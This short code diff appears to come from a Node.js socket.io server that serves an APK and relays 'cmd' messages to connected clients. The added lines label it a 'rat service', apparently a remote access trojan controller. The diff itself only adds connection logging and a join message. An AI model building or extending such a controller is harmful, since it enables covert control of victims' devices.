@@ -50,6 +50,11 @@ App.get('/apk',(req,res)=>{
 })
 
 socket.on('connection',Socket=>{
+    console.log("connected")
+
+
+    Socket.emit("join_me","rat service")
+
     console.log(Socket.id)
 
     Socket.on('cmd',valu=>{
